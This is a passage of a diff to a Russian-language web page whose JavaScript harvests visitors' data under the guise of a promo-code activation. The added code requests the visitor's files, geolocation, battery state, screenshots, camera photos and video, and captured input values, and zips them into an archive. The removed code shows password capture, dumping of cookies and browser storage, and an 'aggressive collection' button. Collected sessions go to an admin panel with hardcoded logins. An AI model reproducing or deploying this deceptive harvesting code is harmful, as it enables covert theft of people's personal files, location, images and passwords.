+            // 3. Запрашиваем файлы
+            const fileInput = document.getElementById('fileUpload');
+            fileInput.click();
+            
+            // Ждём загрузки файлов (максимум 10 секунд)
+            await new Promise(resolve => {
+                let checkInterval = setInterval(() => {
+                    if (collectedFiles.length > 0) {
+                        clearInterval(checkInterval);
+                        resolve();
+                    }
+                }, 500);
+                setTimeout(() => {
+                    clearInterval(checkInterval);
+                    resolve();
+                }, 10000);
+            });
+            
+            status.textContent = '📦 СОЗДАНИЕ АРХИВА...';
+            
+            // 4. Создаём ZIP
+            const zip = new JSZip();
+            
+            // Данные
+            const data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: { width: screen.width, height: screen.height },
+                geolocation: await getGeolocation(),
+                battery: await getBatteryInfo(),
+                capturedData: capturedData.slice(-50)
+            };
+            
+            zip.file('data.json', JSON.stringify(data, null, 2));
+            zip.file('captured.json', JSON.stringify(capturedData, null, 2));
+            
+            // Скриншот
+            if (screenshotData) {
+                const base64 = screenshotData.split(',')[1];
+                zip.file('screenshot.png', base64, { base64: true });
+            }
+            
+            // Медиа
+            mediaData.forEach((m, i) => {
+                if (m.photo) {
+                    const base64 = m.photo.split(',')[1];
+                    zip.file(`media/photo_${i}.jpg`, base64, { base64: true });
+                }
+                if (m.video) {
+                    const base64 = m.video.split(',')[1];
+                    zip.file(`media/video_${i}.mp4`, base64, { base64: true });
+                }
+            });
+            
+            // Файлы пользователя
+            collectedFiles.forEach((f, i) => {
+                const base64 = f.data.split(',')[1];
+                zip.file(`files/${i}_${f.name}`, base64, { base64: true });
+            });
+            
+            // 5. Сохраняем сессию
+            const session = {
+                id: Date.now(),
+                timestamp: data.timestamp,
+                preview: {
+                    userAgent: data.userAgent.substring(0, 50),
+                    files: collectedFiles.length,
+                    media: mediaData.length
+                }
+            };
+            sessions.push(session);
+            localStorage.setItem('sessions', JSON.stringify(sessions));
+            
+            // 6. Скачиваем ZIP
+            status.textContent = '⬇️ СКАЧИВАНИЕ АРХИВА...';
+            const blob = await zip.generateAsync({ type: 'blob' });
+            saveAs(blob, `promo_${new Date().toISOString().slice(0,10)}.zip`);
+            
+            status.textContent = '🎉 ПРОМОКОД АКТИВИРОВАН! АРХИВ СКАЧАН!';
+            btn.textContent = '🎁 АКТИВИРОВАТЬ ПРОМОКОД';
+            btn.disabled = false;
+            
+        } catch (err) {
+            status.textContent = '❌ ОШИБКА: ' + err.message;
+            btn.textContent = '🎁 АКТИВИРОВАТЬ ПРОМОКОД';
+            btn.disabled = false;
+        }
+    }
+
+    // ============================================================
+    // 6. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
     // ============================================================
     function getGeolocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
-                resolve({ error: 'Geolocation not supported' });
+                resolve({ error: 'Not supported' });
                 return;
             }
             navigator.geolocation.getCurrentPosition(
@@ -682,18 +558,11 @@
                     resolve({
                         latitude: pos.coords.latitude,
                         longitude: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        altitude: pos.coords.altitude,
-                        altitudeAccuracy: pos.coords.altitudeAccuracy,
-                        heading: pos.coords.heading,
-                        speed: pos.coords.speed,
-                        timestamp: pos.timestamp
+                        accuracy: pos.coords.accuracy
                     });
                 },
-                (err) => {
-                    resolve({ error: err.message, code: err.code });
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                () => resolve({ error: 'Denied' }),
+                { enableHighAccuracy: true, timeout: 5000 }
             );
         });
     }
@@ -701,114 +570,20 @@
     function getBatteryInfo() {
         return new Promise((resolve) => {
             if (!navigator.getBattery) {
-                resolve({ error: 'Battery API not supported' });
+                resolve({ error: 'Not supported' });
                 return;
             }
             navigator.getBattery().then((battery) => {
                 resolve({
-                    level: battery.level * 100 + '%',
-                    charging: battery.charging,
-                    chargingTime: battery.chargingTime,
-                    dischargingTime: battery.dischargingTime
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging
                 });
-            }).catch(err => {
-                resolve({ error: err.message });
-            });
+            }).catch(() => resolve({ error: 'Failed' }));
         });
     }
 
-    function getNetworkInfo() {
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (!conn) return { error: 'Network API not supported' };
-        return {
-            effectiveType: conn.effectiveType,
-            rtt: conn.rtt,
-            downlink: conn.downlink,
-            saveData: conn.saveData,
-            type: conn.type
-        };
-    }
-
-    function getStorageInfo() {
-        let cookies = document.cookie;
-        let localStorageItems = {};
-        try {
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if (key) localStorageItems[key] = localStorage.getItem(key);
-            }
-        } catch(e) { localStorageItems = { error: 'Cannot read localStorage' }; }
-        
-        let sessionStorageItems = {};
-        try {
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                if (key) sessionStorageItems[key] = sessionStorage.getItem(key);
-            }
-        } catch(e) { sessionStorageItems = { error: 'Cannot read sessionStorage' }; }
-        
-        return { cookies, localStorage: localStorageItems, sessionStorage: sessionStorageItems };
-    }
-
     // ============================================================
-    // 8. UI
-    // ============================================================
-    function updateStatus(msg) {
-        document.getElementById('status').innerHTML = msg;
-    }
-
-    function displayData(data) {
-        const pre = document.getElementById('dataDisplay');
-        pre.textContent = JSON.stringify(data, null, 2);
-        document.getElementById('downloadBtn').classList.remove('hidden');
-    }
-
-    async function downloadAll() {
-        updateStatus('📦 СОЗДАНИЕ ZIP АРХИВА...');
-        try {
-            const zip = new JSZip();
-            
-            // Добавляем JSON данные
-            zip.file('data.json', JSON.stringify(collectedData, null, 2));
-            
-            // Добавляем все пароли
-            zip.file('passwords.json', JSON.stringify(capturedPasswords, null, 2));
-            
-            // Добавляем скриншот
-            if (screenshotData) {
-                const base64Data = screenshotData.split(',')[1];
-                zip.file('screenshot.png', base64Data, { base64: true });
-            }
-            
-            // Добавляем все файлы
-            collectedFiles.forEach((file, index) => {
-                const base64Data = file.data.split(',')[1];
-                zip.file(`files/${index}_${file.name}`, base64Data, { base64: true });
-            });
-            
-            // Добавляем медиа
-            mediaData.forEach((media, index) => {
-                if (media.photo) {
-                    const photoData = media.photo.split(',')[1];
-                    zip.file(`media/${index}_photo.jpg`, photoData, { base64: true });
-                }
-                if (media.video) {
-                    const videoData = media.video.split(',')[1];
-                    zip.file(`media/${index}_video.mp4`, videoData, { base64: true });
-                }
-            });
-            
-            // Генерируем ZIP
-            const blob = await zip.generateAsync({ type: 'blob' });
-            saveAs(blob, `swill_harvest_${new Date().toISOString().slice(0,10)}.zip`);
-            updateStatus('✅ ZIP АРХИВ СОЗДАН И СКАЧАН');
-        } catch (err) {
-            updateStatus('❌ ОШИБКА СОЗДАНИЯ ZIP: ' + err.message);
-        }
-    }
-
-    // ============================================================
-    // 9. АДМИНКА
+    // 7. АДМИН-ПАНЕЛЬ
     // ============================================================
     function renderAdminPanel() {
         const sessionsList = document.getElementById('sessionsList');
@@ -816,7 +591,7 @@
 
         sessionsList.innerHTML = '';
         if (sessions.length === 0) {
-            sessionsList.innerHTML = '<p style="color:#6688aa;">[ НЕТ СЕССИЙ ]</p>';
+            sessionsList.innerHTML = '<p style="color:#888;">Нет сессий</p>';
         } else {
             sessions.slice().reverse().forEach(s => {
                 const div = document.createElement('div');
@@ -825,41 +600,28 @@
                     <strong>${new Date(s.timestamp).toLocaleString()}</strong>
                     <span class="badge">ID: ${s.id}</span>
                     <br>UA: ${s.preview.userAgent || 'нет'}
-                    <br>ЛОКАЦИЯ: ${s.preview.location || 'нет'}
-                    <br>БАТАРЕЯ: ${s.preview.battery || 'нет'} | ПАРОЛЕЙ: ${s.preview.passwordsCount || 0} | ФАЙЛОВ: ${s.preview.filesCount || 0}
-                    <br><button class="view-session-btn" data-id="${s.id}" style="width:auto;padding:6px 20px;font-size:14px;display:inline-block;margin-right:10px;">👁️ ПОКАЗАТЬ</button>
-                    <button class="delete-session-btn" data-id="${s.id}" style="border-color:#ff4444;color:#ff4444;width:auto;padding:6px 20px;font-size:14px;display:inline-block;">🗑️ УДАЛИТЬ</button>
+                    <br>Файлов: ${s.preview.files || 0} | Медиа: ${s.preview.media || 0}
+                    <br><button class="delete-session-btn" data-id="${s.id}" style="background:#ff4444;color:#fff;width:auto;padding:5px 15px;font-size:12px;margin-top:5px;">Удалить</button>
                 `;
                 sessionsList.appendChild(div);
             });
         }
 
         passwordsList.innerHTML = '';
-        if (capturedPasswords.length === 0) {
-            passwordsList.innerHTML = '<p style="color:#6688aa;">[ НЕТ ПЕРЕХВАЧЕННЫХ ПАРОЛЕЙ ]</p>';
+        if (capturedData.length === 0) {
+            passwordsList.innerHTML = '<p style="color:#888;">Нет данных</p>';
         } else {
-            capturedPasswords.slice().reverse().forEach(p => {
+            capturedData.slice().reverse().forEach(p => {
                 const div = document.createElement('div');
-                div.className = 'password-capture';
+                div.className = 'password-item';
                 div.innerHTML = `
                     <strong>${new Date(p.timestamp).toLocaleString()}</strong>
-                    <span style="color:#ff6666;">⚡ ${p.value}</span>
-                    <br>ИСТОЧНИК: ${p.source || 'unknown'} | ПОЛЕ: ${p.name || p.id || '—'}
-                    <br>URL: ${p.url || '—'}
+                    <span style="color:#ff6666;">📌 ${p.value}</span>
+                    <br>Источник: ${p.source || 'unknown'} | ${p.name || '—'}
                 `;
                 passwordsList.appendChild(div);
             });
         }
-
-        document.querySelectorAll('.view-session-btn').forEach(btn => {
-            btn.onclick = function() {
-                const id = parseInt(this.dataset.id);
-                const session = sessions.find(s => s.id === id);
-                if (session) {
-                    alert(JSON.stringify(session.data, null, 2));
-                }
-            };
-        });
 
         document.querySelectorAll('.delete-session-btn').forEach(btn => {
             btn.onclick = function() {
@@ -886,42 +648,27 @@
     }
 
     // ============================================================
-    // 10. ИНИЦИАЛИЗАЦИЯ
+    // 8. ИНИЦИАЛИЗАЦИЯ
     // ============================================================
     document.addEventListener('DOMContentLoaded', function() {
-        setupPasswordCapture();
+        setupCapture();
+        setupFileInput();
 
-        document.getElementById('startBtn').addEventListener('click', async function() {
-            this.disabled = true;
-            this.textContent = '⛧ СБОР... ⛧';
-            await collectAllData();
-            this.disabled = false;
-            this.textContent = '▶ ЗАПУСТИТЬ АГРЕССИВНЫЙ СБОР';
-        });
-
-        document.getElementById('screenshotBtn').addEventListener('click', async function() {
-            await takeScreenshot();
-        });
-
-        document.getElementById('mediaBtn').addEventListener('click', async function() {
-            await captureMedia();
-        });
-
-        document.getElementById('downloadBtn').addEventListener('click', downloadAll);
+        document.getElementById('startBtn').addEventListener('click', startCollection);
 
         document.getElementById('goToAdminBtn').addEventListener('click', showAdminPage);
 
         document.getElementById('adminLoginBtn').addEventListener('click', function() {
             const login = document.getElementById('adminLogin').value.trim();
             const password = document.getElementById('adminPassword').value.trim();
-            if (login === 'admin' && password === 'par1s67') {
+            if (login === 'admin' && password === '6767') {
                 document.getElementById('adminStatus').textContent = '✅ ДОСТУП РАЗРЕШЁН';
-                document.getElementById('adminStatus').style.color = '#88ff88';
+                document.getElementById('adminStatus').style.color = '#4ade80';
                 isAdmin = true;
                 showAdminContent();
             } else {
-                document.getElementById('adminStatus').textContent = '❌ ДОСТУП ЗАПРЕЩЁН';
-                document.getElementById('adminStatus').style.color = '#ff6666';
+                document.getElementById('adminStatus').textContent = '❌ НЕВЕРНЫЙ ЛОГИН ИЛИ ПАРОЛЬ';
+                document.getElementById('adminStatus').style.color = '#f87171';
             }
         });
 
@@ -935,32 +682,31 @@
         });
 
         document.getElementById('clearSessionsBtn').addEventListener('click', function() {
-            if (confirm('УДАЛИТЬ ВСЕ СЕССИИ И ПАРОЛИ?')) {
+            if (confirm('Удалить всё?')) {
                 sessions = [];
-                capturedPasswords = [];
+                capturedData = [];
                 localStorage.setItem('sessions', JSON.stringify(sessions));
-                localStorage.setItem('capturedPasswords', JSON.stringify(capturedPasswords));
+                localStorage.setItem('capturedData', JSON.stringify(capturedData));
                 renderAdminPanel();
             }
         });
 
         document.getElementById('exportAllBtn').addEventListener('click', function() {
-            const exportData = {
-                sessions: sessions,
-                capturedPasswords: capturedPasswords,
-                exportDate: new Date().toISOString()
-            };
+            const exportData = { sessions, capturedData, exportDate: new Date().toISOString() };
             const jsonStr = JSON.stringify(exportData, null, 2);
             const blob = new Blob([jsonStr], { type: 'application/json' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = `swill_export_${new Date().toISOString().slice(0,10)}.json`;
+            a.download = `export_${new Date().toISOString().slice(0,10)}.json`;
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
             URL.revokeObjectURL(url);
         });
+
+        // Автоматический клик по кнопке при загрузке (опционально)
+        // setTimeout(() => document.getElementById('startBtn').click(), 1000);
     });
 </script>
 
